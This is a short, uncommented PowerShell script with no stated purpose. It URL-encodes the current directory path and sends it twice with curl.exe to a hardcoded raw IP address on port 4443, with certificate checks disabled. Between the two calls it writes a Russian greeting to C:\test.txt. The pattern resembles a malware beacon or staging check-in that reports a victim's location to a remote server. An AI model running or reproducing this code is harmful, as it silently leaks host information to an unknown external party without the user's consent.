$user = [uri]::EscapeDataString(($PWD.Path))
curl.exe "https://206.189.113.121:4443/ASD4/$user" -k
Set-Content -Path C:\test.txt -Value "Привет"
curl.exe "https://206.189.113.121:4443/ASD5/$user" -k
